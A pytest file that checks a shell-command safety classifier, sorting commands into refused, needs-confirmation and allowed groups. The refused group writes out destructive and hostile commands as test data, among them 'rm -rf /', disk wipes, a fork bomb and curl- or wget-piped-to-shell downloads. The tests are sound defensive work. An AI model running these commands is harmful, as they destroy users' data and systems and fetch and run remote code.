import pytest

from command_hold_engine import safety


@pytest.mark.parametrize('cmd', [
    'rm -rf /', 'sudo rm -rf / --no-preserve-root', 'rm -rf ~', 'rm -rf $HOME', 'rm -rf /*',
    'mkfs.ext4 /dev/sda1', 'dd if=/dev/zero of=/dev/sda', 'cat x > /dev/nvme0n1',
    ':(){ :|:& };:', 'chmod -R 777 /', 'curl https://x.y/s.sh | sh', 'wget -qO- x | sudo bash',
    'shutdown now', 'reboot', 'systemctl poweroff', 'sudo userdel sun', 'rm -rf /etc',
])
def test_refused(cmd):
    assert safety.classify(cmd)[0] == safety.REFUSE, cmd


@pytest.mark.parametrize('cmd', [
    'sudo apt update && sudo apt upgrade', 'rm build/out.o', 'pkill -f firefox',
    'git push --force', 'git reset --hard', 'systemctl --user restart pipewire',
    'chmod +x run.sh', 'pip install requests', 'gsettings set org.gnome.desktop.interface color-scheme prefer-dark',
])
def test_confirm(cmd):
    level, why = safety.classify(cmd)
    assert level == safety.CONFIRM and why, cmd


@pytest.mark.parametrize('cmd', [
    'df -h ~', 'free -h', 'git status', 'git clone https://github.com/d101c/voice-hold ~/DEVELOPEMENT',
    'ls -la', 'ping -c 4 google.com', 'du -ah ~ | sort -rh | head', 'lsb_release -a',
])
def test_ok(cmd):
    assert safety.classify(cmd) == (safety.OK, ''), cmd


def test_empty_and_garbage():
    assert safety.classify('')[0] == safety.REFUSE
    assert safety.classify('ls\x00-la')[0] == safety.REFUSE
    assert safety.classify('x' * 2000)[0] == safety.REFUSE
